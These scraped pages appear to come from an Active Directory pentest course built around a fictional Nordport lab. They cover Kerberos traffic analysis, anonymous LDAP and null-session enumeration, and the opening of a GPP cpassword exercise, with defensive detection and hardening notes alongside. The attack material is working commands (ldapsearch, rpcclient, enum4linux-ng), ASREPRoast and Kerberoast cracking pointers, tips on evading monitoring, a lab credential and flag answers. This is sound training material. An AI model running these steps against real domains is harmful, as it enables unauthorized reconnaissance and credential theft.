Kali - Read the AS-REP packet

tshark -r /tmp/kerb.pcap -V -Y "kerberos.msg_type == 11" | less

Inside the AS-REP:

Kerberos
    Pvno: 5
    MSG Type: AS-REP (11)
    crealm: CORP.NORDPORT.LOCAL
    cname: j.chen
    ticket
        tkt-vno: 5
        realm: CORP.NORDPORT.LOCAL
        sname: krbtgt/CORP.NORDPORT.LOCAL
        enc-part: <encrypted with krbtgt key>
    enc-part: <encrypted with user key, contains session key>

The TGT body lives in the ticket field. The service name (sname) of a TGT is always krbtgt/<REALM>. Fragment 2 is the literal string speaks; the verb that describes what the KDC is doing in the AS-REP (it speaks the TGT into existence).

docs.title: Step 8: Analyze TGS-REQ for Fragment 3
docs.text:
Kali - Read the TGS-REQ packet

tshark -r /tmp/kerb.pcap -V -Y "kerberos.msg_type == 12" | less

Inside the TGS-REQ:

Kerberos
    Pvno: 5
    MSG Type: TGS-REQ (12)
    padata: 1 item
        PA-DATA pA-TGS-REQ
            <AP-REQ wrapping the TGT>
    req-body
        sname:
            name-type: kRB5-NT-SRV-INST (2)
            sname-string: cifs
            sname-string: corp-dc01.corp.nordport.local

The sname.name-string array tells the KDC which service the client is requesting. The first element is the service class (cifs). The second is the host. Fragment 3 is the literal string 4_messages; the count that completes the workbook's main lesson, "the KDC speaks 4 messages."

docs.title: Step 9: Assemble and Submit
docs.text:
Concatenate Fragment 1 + Fragment 2 + Fragment 3, wrap in OCR{...} joined with underscores per the protocol field naming.

Kali - Assemble the flag

F1='kdc'
F2='speaks'
F3='4_messages'
echo "OCR{${F1}_${F2}_${F3}}"

The output is your assembled flag in the form OCR{<F1>_<F2>_<F3>}. Submit it on the platform.

docs.title: Blue Team Perspective
docs.text:
Every Kerberos exchange leaves a security event on the DC. The four events below cover almost every detection a SOC writes for the protocol; learn what they look like clean so you recognize the abuse cases in later exercises.

Activity Event ID Where it fires AS-REQ -> AS-REP success 4768 (TGT issued) DC Security log AS-REQ pre-auth failure 4771 (Pre-authentication failed) DC Security log TGS-REQ -> TGS-REP success 4769 (Service ticket requested) DC Security log TGS-REQ failure 4773 DC Security log

What attacks look like in 4768/4769

A normal user's daily activity produces one or two 4768 events (one TGT in the morning, maybe one after a renewal) and a steady trickle of 4769 events (one per distinct service contacted). ASREPRoast looks like a 4768 with Pre-Authentication Type: 0; the giveaway. Kerberoast shows up as a burst of 4769 events from a single user requesting many SPNs in seconds, often with Ticket Encryption Type: 0x17 (RC4) when the attacker forces a downgrade to make cracking faster.

docs.title: Hardening Note
docs.text:
Kerberos is fundamentally trust-on-key. You harden it by raising the cost of forging or cracking those keys.

Practical Kerberos hardening

  • Rotate the krbtgt account password twice every 6-12 months. The double rotation invalidates lingering golden tickets without breaking active sessions.
  • Disable RC4 Kerberos encryption forest-wide. Force AES-128/256 via msDS-SupportedEncryptionTypes so kerberoast cracking takes orders of magnitude longer.
  • Move all service accounts to gMSAs (Group Managed Service Accounts). The KDC manages and rotates the password automatically; the resulting hash is far too long to crack offline.
  • Audit and clear the DONT_REQ_PREAUTH UAC bit on every account quarterly.
  • Forward 4768/4769/4771 to a SIEM with detection rules for: pre-auth = 0, encryption type = 0x17 on a service ticket, multiple SPNs requested by the same user inside one minute.

docs.title: Record Your Findings
docs.text:
AS-REQ msg_type: 10 AS-REP msg_type: 11 TGS-REQ msg_type: 12 TGS-REP msg_type: 13

Fragment 1 (AS-REQ): kdc Fragment 2 (AS-REP): speaks Fragment 3 (TGS-REQ): 4_messages

Assembled flag: OCR{________} (join your three fragments with underscores)

docs.title: Analysis Questions
docs.text:
1. ASREPRoast targets the AS-REP message. What specifically about pre-authentication makes the AS-REP attackable, and why is DONT_REQ_PREAUTH so rare in modern environments?

Reveal Answer

Pre-authentication means the AS-REQ includes a timestamp encrypted with the user's password-derived key. The KDC verifies that timestamp before issuing an AS-REP. If verification fails the KDC returns an error rather than an encrypted blob, so an attacker cannot get a crackable ciphertext from a guess. With DONT_REQ_PREAUTH set on a user, the KDC skips the timestamp check and returns an AS-REP whose enc-part is encrypted with the user's key. That blob is then crackable offline. DONT_REQ_PREAUTH is rare today because Microsoft turns pre-auth on by default, modern provisioning rarely disables it, and detection tools flag the AUC bit. It typically survives only on legacy service accounts where pre-auth was disabled to support an old protocol that did not implement it (often early 2000s integrations) and was never re-enabled.

2. Kerberoast targets the TGS-REP. Which key encrypts the service ticket, and why is the strength of that key the entire game?

Reveal Answer

The service ticket inside a TGS-REP is encrypted with the service account's password-derived key (not the user's, not the KDC's). When you request a TGS-REP for an SPN that resolves to a domain user account (typical for service accounts that auto-register an SPN like MSSQLSvc/...), the encrypted blob you get back is essentially a hash of the service account's password under your chosen ticket. If the service account's password is weak, you can crack the blob offline with hashcat mode 13100. The TGS-REP looks like normal traffic: any authenticated user is allowed to request a TGS for any SPN, and the KDC has no way to know whether the requester intends to actually use the ticket. The defense is strong service account passwords (managed service accounts, gMSAs); not blocking the request itself.

3. The TGS-REQ presents the TGT as proof of identity inside its padata. If you forge a TGT (golden ticket), every TGS-REQ you make will be accepted. Why does a forged TGT survive password rotation of normal users but not rotation of a special account?

Reveal Answer

A golden ticket is a TGT forged with the krbtgt account's NTLM hash. The KDC validates incoming TGTs by decrypting them with krbtgt's key. Since you encrypted the forged TGT with the same key, the KDC accepts it as authentic. Rotating the password of any normal user does not change krbtgt and therefore does not invalidate the forged TGT. Only rotating krbtgt (twice, since the previous and current passwords are both honored briefly) invalidates the forgery. Most organizations have never rotated krbtgt. The "rotate twice" recommendation exists because rotating once leaves a window where forged tickets encrypted with the old key are still accepted; the second rotation discards the old key entirely. Treat krbtgt as a Tier-0 secret on par with the Domain Admin password.

docs.title: Key Takeaways
docs.text:
• Kerberos has four messages: AS-REQ (10), AS-REP (11), TGS-REQ (12), TGS-REP (13). Memorize the numbers; tshark filters them by integer.
  • AS-REP is encrypted with the user's key (target of ASREPRoast).
  • TGS-REP service ticket is encrypted with the service account's key (target of Kerberoast).
  • TGT is encrypted with krbtgt's key (target of golden ticket forgery).
  • Pre-authentication is the timestamp encrypted in the AS-REQ; its absence makes the AS-REP attackable.
  • kinit produces a clean AS exchange; the first SMB connect after kinit produces a clean TGS exchange.

docs.title: Cheat Sheet Recap
docs.text:
The five operations below are the smallest set you need to drive a clean Kerberos protocol study or to drive a Kerberos attack later in the track.

Goal Command Capture Kerberos traffic sudo tshark -i any -f "host <dc> and port 88" -w kerb.pcap Filter to a single message type tshark -r kerb.pcap -V -Y "kerberos.msg_type == 11" Request a TGT (clean AS exchange) echo '<pw>' \| kinit <user>@<REALM> Trigger a TGS-REQ for cifs/<host> smbclient //<host>/<share> -k -c "ls" List cached tickets klist

docs.title: Spaced Repetition
docs.text:
Card 1: Four Kerberos Message Types

Q: Name the four core Kerberos message types and their integer codes.

Answer

AS-REQ (10); client requests a TGT. AS-REP (11); KDC issues a TGT. TGS-REQ (12); client requests a service ticket using the TGT as proof. TGS-REP (13); KDC issues a service ticket. Memorize 10/11/12/13 because tshark and Wireshark display filters use the integers.

Card 2: Which Key Encrypts What

Q: For each of AS-REP enc-part, AS-REP TGT body, TGS-REP enc-part, and TGS-REP service ticket body, name the key that encrypts it.

Answer

AS-REP enc-part: the user's password-derived key (target of ASREPRoast). AS-REP TGT body: the krbtgt account's key (target of golden ticket forgery). TGS-REP enc-part: the TGT session key (held by the user and the KDC). TGS-REP service ticket body: the service account's password-derived key (target of Kerberoast).

Card 3: tshark Display Filter for Each Message

Q: Write the tshark -Y filter expression for each of AS-REQ, AS-REP, TGS-REQ, and TGS-REP.

Answer

kerberos.msg_type == 10 (AS-REQ), kerberos.msg_type == 11 (AS-REP), kerberos.msg_type == 12 (TGS-REQ), kerberos.msg_type == 13 (TGS-REP). Combine with && and kerberos.CNameString == "user" to filter to a specific principal.

Card 4: Triggering a Clean TGS-REQ from Linux

Q: With kinit already cached, write the smbclient command that produces exactly one TGS-REQ for the cifs service of srv01.corp.local.

Answer 
smbclient //srv01.corp.local/Share -k -c "ls"

-k tells smbclient to use the cached Kerberos credential. The first connect triggers a TGS-REQ for cifs/srv01.corp.local@CORP.LOCAL. Subsequent connects within the ticket lifetime reuse the cached TGS.

Card 5: pA-ENC-TIMESTAMP and ASREPRoast

Q: What field in the AS-REQ proves pre-authentication, and what user account control flag disables it?

Answer

The padata array contains a pA-ENC-TIMESTAMP element whose value is a timestamp encrypted with the user's password-derived key. Its presence proves the user knows the password. The DONT_REQ_PREAUTH UAC flag (0x400000, decimal 4194304) disables the requirement; the KDC then issues an AS-REP without the check, exposing the encrypted enc-part to offline cracking via Hashcat mode 18200. Find ASREPRoastable accounts with the LDAP filter (userAccountControl:1.2.840.113556.1.4.803:=4194304).

docs.title: Before You Begin
docs.text:
Most domains today require authentication for any meaningful directory query. That default is comparatively recent. Migrations from older domain functional levels often preserve a legacy compatibility setting called Pre-Windows 2000 Compatible Access, a built-in group that, when it contains the well-known ANONYMOUS LOGON SID, lets unauthenticated callers read selected directory attributes. The artifact survives in production environments far longer than it should because removing it requires re-testing every legacy integration that depended on it. Exercise 2.1 asks you to find that artifact on Nordport's DC.

You will not use credentials. You will use anonymous LDAP binds and SMB null sessions to enumerate as much of the directory as the misconfiguration exposes, then read the flag from the info attribute of a per-token user.

Tools required: ldapsearch, rpcclient, smbclient, enum4linux-ng, netexec. All are pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "Before you steal a credential, find out what the company is giving you for free. Nordport upgraded their forest from 2012 R2 last year. Migrations leave bread crumbs. The Pre-Windows 2000 Compatible Access group is one of the loudest. Find out whether it still contains ANONYMOUS LOGON. If it does, half of the directory is yours without a single password guess."

Your scope token is exposed as the environment variable OCR_SCOPE_TOKEN and shown in the lab dashboard. There is a per-token user account whose sAMAccountName contains your token. Find it via anonymous LDAP and read its info attribute.

Credentials: none. The exercise is unauthenticated.

Domain: corp.nordport.local Domain controller: corp-dc01

docs.title: Your Objectives
docs.text:
• Verify whether anonymous SMB null sessions and anonymous LDAP binds work against corp-dc01
  • Use ldapsearch -x (no bind) to extract user, group, and OU lists
  • Use rpcclient -U "" to walk anonymous RPC interfaces
  • Locate the per-token user account whose sAMAccountName contains your scope token
  • Read the user's info attribute and submit the flag inside

docs.title: Authenticated vs Anonymous Surface
docs.text:
The same DC presents two very different views depending on whether you bind with credentials or not. The comparison below shows what each surface yields on a typical migrated forest like Nordport.

Capability Authenticated user Anonymous (legacy compat ON) Anonymous (modern hardened) (objectClass=user) enumeration yes yes rootDSE only Read description / info yes yes no Read memberOf yes usually no Read (objectClass=computer) yes partial no Read (objectClass=trustedDomain) yes yes no SMB share list (-L) yes usually no no RPC enumdomusers yes sometimes no

docs.title: Decision Path for the First Five Minutes
docs.text:
The flowchart below is the order to run probes against an unknown DC. The whole sequence takes under two minutes; if the answer is "modern hardened", you waste no time and move on to credentialed work.

flowchart TD
    Start["Unknown DC at <ip>"]
    A["ldapsearch -x ... -s base namingContexts"]
    B{"rootDSE returned?"}
    C["ldapsearch -x ... '(objectClass=user)' sAMAccountName"]
    D{"Users returned?"}
    E["Anonymous LDAP read enabled<br/>= legacy compat ON"]
    F["rpcclient -U '' -N <ip><br/>then enumdomusers"]
    G{"Users returned?"}
    H["SAMR null session enabled"]
    I["Modern hardened DC<br/>move to credentialed phase"]

    Start --> A --> B
    B -- "no" --> I
    B -- "yes" --> C --> D
    D -- "yes" --> E --> F --> G
    D -- "no" --> F
    G -- "yes" --> H
    G -- "no" --> I

docs.title: Background: Why Anonymous Reads Used to Work
docs.text:
Active Directory inherited a behavior model from Windows NT 4.0 where unauthenticated systems sometimes needed to enumerate the directory: NetBIOS browsers, downlevel print servers, certain monitoring tools, third-party single-sign-on integrations. Microsoft codified two compatibility surfaces:

  1. Pre-Windows 2000 Compatible Access built-in group (SID S-1-5-32-554). When ANONYMOUS LOGON (SID S-1-5-7) or the more permissive EVERYONE (S-1-1-0) is a member, unauthenticated callers gain pre-2000-style read access to user and group objects. The legacy group has read DACEs on most user attributes by default.
  2. dSHeuristics Bit 7 (fAllowAnonNSPI). A configuration value on CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,.... When this 7th character of the string is 2, anonymous LDAP binds are permitted to query the directory. When it is 0 or absent, anonymous binds return only rootDSE.

Modern Microsoft guidance is to leave both off. Migrations from 2003/2008/2012 to 2016/2019/2022 sometimes preserve them. A defender who runs Get-ADGroupMember "Pre-Windows 2000 Compatible Access" and finds ANONYMOUS LOGON should remove it and accept the risk of breaking any legacy integration that depended on it.

docs.title: What an anonymous client can see when both are misconfigured
docs.text:
• All user objects via (objectClass=user)
  • All group objects via (objectClass=group)
  • All OUs via (objectClass=organizationalUnit)
  • Most user attributes: sAMAccountName, description, info, memberOf, userAccountControl, pwdLastSet, lastLogonTimestamp
  • The full domain SID via LDAP://<domain DN>
  • All trusts via (objectClass=trustedDomain)

The combination is essentially the same data that an authenticated low-privileged user can see. The only difference is the attacker did not have to guess or steal a credential first.

docs.title: What does NOT work anonymously
docs.text:
• Get-ADComputer-equivalent queries on (objectClass=computer) are usually filtered tighter; anonymous reads return little.
  • Group memberships (the member attribute on the group, not memberOf on the user) are sometimes hidden.
  • Any object explicitly DACL'd to require authentication.
  • SMB null session lookups against \\corp-dc01\C$ and other admin shares.

docs.title: ldapsearch with anonymous bind
docs.text:
Drop -D and -w for an anonymous simple bind. -x selects the simple-bind mechanism rather than SASL (which would require Kerberos credentials).

ldapsearch -x -LLL -H ldap://<dc_ip> \
  -b "DC=corp,DC=nordport,DC=local" \
  "(objectClass=user)" sAMAccountName description info

Without authentication, the server applies the ACLs that grant access to ANONYMOUS LOGON and the Pre-Windows 2000 Compatible Access group. If anonymous binds are disabled, you get Invalid credentials immediately.

docs.title: rpcclient null session
docs.text:
rpcclient -U "" -N <dc_ip>

-U "" sets the username to empty. -N says "no password prompt." On the prompt:

Command Effect (when null sessions allowed) srvinfo Server info enumdomusers List domain users (RID + sAMAccountName) enumdomgroups List domain groups lookupnames <name> Resolve a name to SID anonymously lookupsids S-1-5-21-...-500 Resolve a SID to name anonymously getdompwinfo Domain password policy

Modern DCs reject most of these unless the legacy compatibility group is misconfigured. Try them all anyway.

docs.title: enum4linux-ng
docs.text:
Wraps rpcclient, smbclient, and ldapsearch into one comprehensive scan. Excellent first pass.

enum4linux-ng -A <dc_ip>

-A runs every check (users, groups, shares, password policy, OS info, sessions). Results print by category.

docs.title: smbclient null session
docs.text:
smbclient -L //<dc_ip>/ -N

-L lists shares. -N skips the password prompt. Most DCs deny anonymous share enumeration even when LDAP allows anonymous reads; the layers are independent.

docs.title: Step 1: Confirm Your Scope Token
docs.text:
Kali - Print scope token

echo "$OCR_SCOPE_TOKEN"

If empty, copy the value from the lab dashboard banner ("Your scope: xxxx") and export OCR_SCOPE_TOKEN=xxxx.

docs.title: Step 2: Probe Anonymous LDAP
docs.text:
Kali - Anonymous bind probe

ldapsearch -x -LLL -H ldap://<dc_ip> -s base "(objectClass=*)" namingContexts

The query asks for rootDSE. Every LDAP server responds to this anonymously. If you get a response listing naming contexts (DC=corp,DC=nordport,DC=local, plus CN=Configuration,...), the server is reachable. The next test confirms whether deeper queries are allowed.

Kali - Anonymous user enumeration

ldapsearch -x -LLL -H ldap://<dc_ip> \
  -b "DC=corp,DC=nordport,DC=local" \
  "(objectClass=user)" sAMAccountName \
  | head -50

What is different from the authenticated form (Exercise 1.1):

Flag Effect -x Simple bind (required for anonymous; SASL needs credentials). -LLL Strip LDIF noise. -H ldap://<dc_ip> LDAP URL. (no -D) NO bind DN supplied: triggers anonymous bind. (no -w) NO password supplied. -b "DC=..." Search base. "(objectClass=user)" Return user objects. sAMAccountName Limit attributes to just the username. \| head -50 Cap output at 50 lines so a wide-open server does not flood your terminal.

What you'll see:

  • If the legacy compat group + dSHeuristics bit 7 are misconfigured (Nordport), you get back a list of users with their sAMAccountName values.
  • If properly hardened, you get an Invalid credentials (49) error or only # search reference placeholders. The empty result is a feature, not a bug.

docs.title: Step 3: Pull Every User with Their Free-Form Attributes
docs.text:
The 1.1 broad search showed description and info are where credentials and notes leak. From an anonymous standpoint, the same attributes are still readable when the legacy compat is in place. Pull the lot, save to file, then grep.

Kali - Anonymous LDAP, all users, with description and info

ldapsearch -x -LLL -H ldap://<dc_ip> \
  -b "DC=corp,DC=nordport,DC=local" \
  "(objectClass=user)" sAMAccountName description info \
  > anon_users.ldif
wc -l anon_users.ldif
head anon_users.ldif

What each piece does:

  • The full ldapsearch command is the same as Step 2 plus the explicit attribute list (sAMAccountName description info). Without it the server returns ALL allowed attributes, ~50 per object, which is overkill.
  • > anon_users.ldif redirect output to a file. Convention is .ldif for LDIF-format dumps but the extension is informational only.
  • wc -l line count. A populated dump should be hundreds of lines (one block per user, ~5-7 lines per block).
  • head shows the first 10 lines so you can confirm the file structure looks right (LDIF is attribute: value per line, blank line between records).

If the file is empty, the anonymous bind was silently rejected; revisit Step 2 with ldapsearch -x -d 1 ... (verbose) to see what is happening.

docs.title: Step 4: Filter to Your Token
docs.text:
The dump contains your ghost_<token> user mixed in with all the other accounts. Filter the search server-side instead of grepping the dump locally.

Kali - Anonymous LDAP filtered to your scope token

ldapsearch -x -LLL -H ldap://<dc_ip> \
  -b "DC=corp,DC=nordport,DC=local" \
  "(sAMAccountName=*${OCR_SCOPE_TOKEN}*)" sAMAccountName info description distinguishedName

What changed from Step 3:

  • "(sAMAccountName=*${OCR_SCOPE_TOKEN}*)" LDAP substring filter. The * wildcards mean "match any chars before/after my token". Bash expands ${OCR_SCOPE_TOKEN} first; the literal sent to the server is (sAMAccountName=*j001*) for token j001.
  • sAMAccountName info description distinguishedName four explicit attributes returned. distinguishedName includes the OU path, useful for understanding where a hidden user lives.

The matching account is ghost_<token>. The info attribute contains the flag embedded in a migration note, like Migration trace from 2012R2: OCR{...}.

Extract just the flag string with grep:

Kali - Pull the OCR{} value out of the info attribute

ldapsearch -x -LLL -H ldap://<dc_ip> \
  -b "DC=corp,DC=nordport,DC=local" \
  "(sAMAccountName=ghost_${OCR_SCOPE_TOKEN})" info \
  | grep -oE 'OCR\{[^}]+\}'

What each piece does:

  • The ldapsearch is now exact-match on the full sAMAccountName (no wildcards) and returns only the info attribute.
  • | grep -oE 'OCR\{[^}]+\}' extract regex matches from stdin.
    • -o print only the matched text, not the whole line.
    • -E extended regex (so \{ is a literal brace).
    • 'OCR\{[^}]+\}' match OCR{ followed by 1+ characters that aren't }, then }.

Submit the matched value on the platform.

docs.title: Step 5: Walk Anonymous RPC for Comparison
docs.text:
You already have the flag. Spend the remaining time learning what else the misconfiguration exposes. RPC is a separate protocol on a separate set of ports (139/445); some calls succeed even when LDAP is locked down, others vice versa. Knowing both attack surfaces is the value of this exercise.

Kali - rpcclient null session

rpcclient -U "" -N <dc_ip>

What each option does:

  • -U "" username is the empty string. With %, the password would follow; without %, no password is supplied.
  • -N no-password mode. Skips the prompt for an empty password. Together with -U "" this is the canonical "null session" connection.

At the rpcclient $> prompt try these commands:

Command What it calls under the hood Effect (when null sessions allowed) srvinfo SRVSVC NetServerGetInfo Server version, comment, capabilities. enumdomusers SAMR EnumDomainUsers List all users with RIDs. enumdomgroups SAMR EnumDomainGroups List all groups. getdompwinfo SAMR GetDomainPwInfo Password policy (min length, complexity flags, lockout). lookupsids S-1-5-21-...-500 LSARPC LsarLookupSids2 Resolve a SID to a name. RID 500 is always Administrator.

Note which commands succeed and which fail. Modern DCs reject most SAMR null calls even when LDAP allows anonymous. The contrast (LDAP yields users, SAMR rejects) is the interesting forensic data.

The domain SID prefix (S-1-5-21-XXXX-YYYY-ZZZZ) appears in the srvinfo response or in the rootDSE from Step 2. RID 500 = Administrator, RID 501 = Guest, RIDs 1000+ = user accounts.

docs.title: Step 6: Run enum4linux-ng for a Full Picture
docs.text:
enum4linux-ng is a wrapper that runs the rpcclient + smbclient + ldapsearch enumeration in one shot. Useful when you want a complete picture without typing twenty commands. The output IS verbose; skim by section.

Kali - One-shot anonymous enumeration

enum4linux-ng -A <dc_ip> > anon_full.txt
less anon_full.txt

What each option does:

  • -A "all checks": users, groups, shares, password policy, OS info, sessions, RID brute. Equivalent to specifying every flag individually. Default is no checks at all (just connection test); always pass -A for first-pass enumeration.
  • <dc_ip> target. Accepts a single IP or CIDR.
  • > anon_full.txt save to file; the output runs ~200-500 lines.

Sections you should look at first:

  • OS Information: is this a DC, a member server, or a workgroup host?
  • Users: full list with RIDs.
  • Groups: local + domain groups.
  • Password Policy: min length, complexity, lockout threshold/duration. Critical for password spraying in Level 3.4.
  • Shares: readable shares with permissions masks.

Compare what enum4linux-ng surfaces against what each underlying tool returned in the previous steps. The aggregator is convenient for reports; the underlying tools are necessary when you need precision.

docs.title: Blue Team Perspective
docs.text:
Anonymous reads against a DC look like normal application traffic at the protocol level, which is exactly the problem. The detection signals that fire come from event subsystems most environments are not collecting unless someone explicitly enabled them.

Activity Event ID Where it fires Anonymous logon to LDAP/SMB 4624 (logon type 3, account name ANONYMOUS LOGON) DC Security log Bulk LDAP queries 1644 (Directory Service Diagnostic) DC Directory Service log Null SAMR enumeration via rpcclient 4661 + 4662 with anonymous SID DC Security log Suspicious enumeration pattern MDI alert "Account enumeration reconnaissance" Defender for Identity

What lights up first

Microsoft Defender for Identity is tuned to spot anonymous SAMR enumeration almost the instant a tool calls enumdomusers against a DC. The alert "Account enumeration reconnaissance" fires within seconds and includes the source IP. A careful operator runs the LDAP probe first (less monitored), reads the data needed, and only escalates to RPC-based enumeration if the LDAP path is blocked.

docs.title: Hardening Note
docs.text:
A modern domain has no business permitting anonymous reads. The remediation is well documented and rarely complicated; what makes it persist is fear of breaking a legacy integration nobody owns anymore.

Practical anonymous-bind hardening

  • Audit Pre-Windows 2000 Compatible Access membership. Remove ANONYMOUS LOGON (S-1-5-7) and EVERYONE (S-1-1-0) unless a documented dependency exists.
  • Verify dSHeuristics position 7 is 0 or absent. View with dsquery * "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=..." -attr dSHeuristics.
  • Set Network access: Allow anonymous SID/Name translation GPO to Disabled.
  • Set Network access: Restrict anonymous access to Named Pipes and Shares to Enabled.
  • Enable Defender for Identity on every DC and route alerts to the SIEM.
  • Enforce LDAP signing and channel binding (LDAPServerIntegrity = 2) so anonymous binds receive LDAP_STRONGER_AUTH_REQUIRED.

docs.title: Record Your Findings
docs.text:
Anonymous LDAP allowed? (yes / no)

Anonymous SMB null session allowed? (yes / no)

Number of users visible anonymously:

(paste the count here)

Per-token user found:

ghost_<token>

Flag:

(OCR{anon_...})

docs.title: Analysis Questions
docs.text:
1. The Pre-Windows 2000 Compatible Access group exists for backwards compatibility with what specific behavior, and what concrete service does it sometimes still need to support today?

Reveal Answer

The group preserved the NT 4.0 behavior of allowing unauthenticated read access to user and group attributes so legacy NT services and downlevel clients could resolve names and SIDs without first establishing authenticated sessions. Today the most commonly cited "still need it" service is older RAS / RADIUS integrations and a handful of third-party SSO bridges that perform LDAP-based identity lookups before the user is authenticated. In well-managed modern environments the group is empty and any tool needing those reads is configured to bind as a service account. When you find ANONYMOUS LOGON still inside the group on a 2019 or 2022 domain, the most likely cause is an incomplete migration where someone added it temporarily and never re-tested its removal.

2. The dSHeuristics attribute is one configuration string with several positional flags. Why does Microsoft model these as positional digits rather than a structured object, and what is the operational risk?

Reveal Answer

dSHeuristics predates structured AD configuration patterns. It was a quick way to expose tunables on the directory service object without adding new schema attributes for each. The string is a sequence of numeric digits, each digit is a separate boolean, and position is meaning. The operational risk is that operators editing one flag (often by hand, via adsiedit.msc) accidentally truncate or extend the string and silently change other flags. Position 7 is fAllowAnonNSPI. Position 9 is fSpecifyGUIDOnAdd. Mistyping by one character moves every flag after it. Defenders should read and write dSHeuristics only via tested scripts that preserve length and only edit the intended position.

3. The combination of "anonymous LDAP allowed" and "anonymous SMB null session denied" is common. Why does the SMB layer get hardened first?

Reveal Answer

SMB null sessions historically exposed share enumeration, NetBIOS lookups, and the SAM RPC interfaces that allowed direct password policy queries and brute force attempts. The attack surface mapped one-to-one onto well-known internet worms (Conficker is the headline example). Microsoft hardened SMB null sessions by default starting in Windows 2003 SP1 and again in 2008, so contemporary DCs deny most anonymous SMB calls regardless of the Pre-Windows 2000 group membership. LDAP anonymous reads, by contrast, were considered safer (read-only, structured) and the hardening defaults shipped later. The result is the asymmetry you see in the field: anonymous LDAP yields a user list while anonymous SMB returns nothing useful.

docs.title: Key Takeaways
docs.text:
• Anonymous bind testing is the highest-leverage probe in the first five minutes of an engagement against an unfamiliar AD.
  • Pre-Windows 2000 Compatible Access containing ANONYMOUS LOGON plus dSHeuristics bit 7 = 2 is the canonical misconfiguration.
  • The info attribute is read by ACLs that often differ from description; both are worth searching.
  • rpcclient -U "" -N and enum4linux-ng -A give you complementary views of which anonymous interfaces are still open.
  • A modern DC denies most anonymous SMB calls even when anonymous LDAP succeeds; do not assume one implies the other.

docs.title: Cheat Sheet Recap
docs.text:
The four probes below are the unauthenticated touch a senior pentester runs reflexively on every new DC. Two minutes of effort, big payoff if the directory was migrated and never cleaned.

Goal Command Probe rootDSE (always works) ldapsearch -x -LLL -H ldap://<dc> -s base "(objectClass=*)" namingContexts Anonymous user enumeration ldapsearch -x -LLL -H ldap://<dc> -b "<DN>" "(objectClass=user)" sAMAccountName description info Null SAMR session rpcclient -U "" -N <dc> then enumdomusers; enumdomgroups; getdompwinfo Aggregated unauthenticated scan enum4linux-ng -A <dc>

docs.title: Spaced Repetition
docs.text:
Card 1: Anonymous LDAP One-Liner

Q: Write the ldapsearch command that performs an anonymous bind against 10.10.10.10 and returns every user's sAMAccountName and info from corp.local.

Answer 
ldapsearch -x -LLL -H ldap://10.10.10.10 \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName info

Drop -D and -w to bind anonymously. -x forces simple bind. If you get Invalid credentials, anonymous binds are disabled.

Card 2: rpcclient Null Session Idiom

Q: How do you start an rpcclient null session against a DC at 10.10.10.10?

Answer 
rpcclient -U "" -N 10.10.10.10

-U "" sets the username to empty. -N skips the password prompt. Useful follow-on commands at the prompt: srvinfo, enumdomusers, enumdomgroups, getdompwinfo, lookupsids <sid>.

Card 3: SID for ANONYMOUS LOGON

Q: What is the well-known SID for ANONYMOUS LOGON, and which built-in group's membership most often re-enables anonymous directory reads when migrated?

Answer

S-1-5-7 for ANONYMOUS LOGON. The legacy group is Pre-Windows 2000 Compatible Access (S-1-5-32-554). When S-1-5-7 is a member of that group on a modern DC, anonymous directory reads work for any attribute the group has been granted. Defenders find it with Get-ADGroupMember "Pre-Windows 2000 Compatible Access" and remove ANONYMOUS LOGON after retesting legacy integrations.

Card 4: dSHeuristics Bit for Anonymous LDAP

Q: Which position in the dSHeuristics string controls fAllowAnonNSPI, and what value enables anonymous LDAP binds?

Answer

Position 7 (1-indexed; index 6 in zero-indexed code). Setting it to 2 enables anonymous LDAP binds. Setting it to 0 or leaving it absent denies them. The attribute lives on CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=... and is editable via adsiedit.msc. Always preserve string length when editing; positions matter.

Card 5: enum4linux-ng First Pass

Q: One command for an unauthenticated all-checks scan against a DC at 10.10.10.10.

Answer 
enum4linux-ng -A 10.10.10.10

-A enables every check: users, groups, shares, OS info, password policy, sessions, RID brute. The output sections are clearly labeled; skim for the Users section first.

docs.title: Before You Begin
docs.text:
In 2014 Microsoft released MS14-025, which removed the ability for Group Policy Preferences (GPP) to deploy local credentials with a cpassword attribute. The patch did not remove or rewrite the cpassword entries that already lived in SYSVOL. SYSVOL replicates to every domain controller, every DC backs it up, every backup ages into archives. Twelve years later you still find decryptable GPP cpassword blobs in production directories. Exercise 2.2 walks you through finding one in Nordport's SYSVOL, decrypting it with the published Microsoft AES key, and using the recovered credential.

Tools required: smbclient, gpp-decrypt, openssl (fallback decryption), netexec. All are pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "MS14-025 patched the creation of new GPP cpassword entries twelve years ago. It did not delete the old ones. SYSVOL is replicated to every DC, so every leak persists forever unless someone goes looking. Find Nordport's. Decrypt it. The recovered credential is yours."

Your scope token (OCR_SCOPE_TOKEN) tells you which one of the per-token GPP entries belongs to you. Decrypting it yields the password for svc_gpp_<token>. That account has read access to a per-token directory under the \\corp-dc01\GPPFlags\ share. The flag lives in FLAG.txt inside your directory.

Credentials:

Username Password Purpose j.chen Welcome2026# Read SYSVOL

Domain: corp.nordport.local Domain controller: corp-dc01

docs.title: Your Objectives
docs.text:
• Mount and recursively download SYSVOL with j.chen credentials
  • Locate a Group Policy Preferences XML file containing cpassword
  • Decrypt the per-token cpassword for your account
  • Authenticate as svc_gpp_<token> with the recovered password
  • Read \\corp-dc01\GPPFlags\<token>\FLAG.txt and submit the flag

docs.title: What SYSVOL Looks Like on Disk
docs.text:
SYSVOL is a single replicated share, but its tree has a fixed shape. Knowing the shape means you grep the right path the first time. The diagram below mirrors the layout you will see on Nordport.

flowchart TD
    SYSVOL["\\\\corp-dc01\\SYSVOL"]
    Domain["corp.nordport.local"]
    Pol["Policies"]
    Scripts["scripts (NETLOGON)"]
    GUID["{31B2F340-...} (Default Domain Policy)"]
    Mach["Machine\\Preferences"]
    Groups["Groups\\Groups.xml<br/>(cpassword candidate)"]
    Sched["ScheduledTasks\\ScheduledTasks.xml"]
    Drives["Drives\\Drives.xml"]
    Svc["Services\\Services.xml"]

    SYSVOL --> Domain
    Domain --> Pol
    Domain --> Scripts
    Pol --> GUID
    GUID --> Mach
    Mach --> Groups
    Mach --> Sched
    Mach --> Drives
    Mach --> Svc

docs.title: cpassword Decryption Pipeline
docs.text:
The decryption is mechanical once you have the ciphertext. The diagram below traces a single cpassword from XML attribute to plaintext.

flowchart LR
    A["cpassword='j1Uyj3Vx...'<br/>(base64, no '=' padding)"]
